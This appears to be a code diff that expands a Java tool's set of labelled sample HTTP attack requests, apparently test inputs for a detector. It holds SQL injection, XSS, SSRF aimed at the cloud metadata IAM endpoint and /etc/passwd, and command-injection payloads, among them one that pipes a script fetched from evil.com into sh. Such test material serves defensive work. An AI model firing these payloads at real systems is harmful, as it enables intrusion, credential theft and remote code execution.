@@ -275,32 +275,67 @@ public class App {
     private static Map<String, Map<String, String>> samplePayloads() {
         Map<String, Map<String, String>> samples = new LinkedHashMap<>();
 
-        samples.put("sqli", new LinkedHashMap<>(Map.of(
+        samples.put("clean", new LinkedHashMap<>(Map.of(
+                "method", "GET",
+                "url", "https://shop.example.com/products?id=24",
+                "headers", "User-Agent: CartierTest\nAccept: */*",
+                "body", ""
+        )));
+
+        samples.put("sqli_union", new LinkedHashMap<>(Map.of(
                 "method", "GET",
                 "url", "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                 "headers", "User-Agent: CartierTest\nAccept: */*",
                 "body", ""
         )));
 
-        samples.put("xss", new LinkedHashMap<>(Map.of(
+        samples.put("sqli_boolean", new LinkedHashMap<>(Map.of(
+                "method", "GET",
+                "url", "https://shop.example.com/login?user=admin' OR 1=1--",
+                "headers", "User-Agent: CartierTest\nAccept: */*",
+                "body", ""
+        )));
+
+        samples.put("xss_script", new LinkedHashMap<>(Map.of(
                 "method", "GET",
                 "url", "https://shop.example.com/search?q=<script>alert(1)</script>",
                 "headers", "User-Agent: CartierTest\nAccept: */*",
                 "body", ""
         )));
 
-        samples.put("ssrf", new LinkedHashMap<>(Map.of(
+        samples.put("xss_event", new LinkedHashMap<>(Map.of(
+                "method", "GET",
+                "url", "https://shop.example.com/profile?bio=<img src=x onerror=alert(1)>",
+                "headers", "User-Agent: CartierTest\nAccept: */*",
+                "body", ""
+        )));
+
+        samples.put("ssrf_meta", new LinkedHashMap<>(Map.of(
                 "method", "POST",
                 "url", "https://shop.example.com/fetch",
                 "headers", "Content-Type: application/json",
                 "body", "{\"url\":\"http://169.254.169.254/latest/meta-data/iam\"}"
         )));
 
-        samples.put("rce", new LinkedHashMap<>(Map.of(
+        samples.put("ssrf_file", new LinkedHashMap<>(Map.of(
+                "method", "POST",
+                "url", "https://shop.example.com/fetch",
+                "headers", "Content-Type: application/json",
+                "body", "{\"url\":\"file:///etc/passwd\"}"
+        )));
+
+        samples.put("rce_chain", new LinkedHashMap<>(Map.of(
                 "method", "POST",
                 "url", "https://shop.example.com/convert",
                 "headers", "Content-Type: application/x-www-form-urlencoded",
                 "body", "file=report.pdf;curl http://evil.com/s.sh|sh"
+        )));
+
+        samples.put("rce_subst", new LinkedHashMap<>(Map.of(
+                "method", "POST",
+                "url", "https://shop.example.com/convert",
+                "headers", "Content-Type: application/x-www-form-urlencoded",
+                "body", "file=report.pdf&format=pdf$(id)"
         )));
 
         return samples;
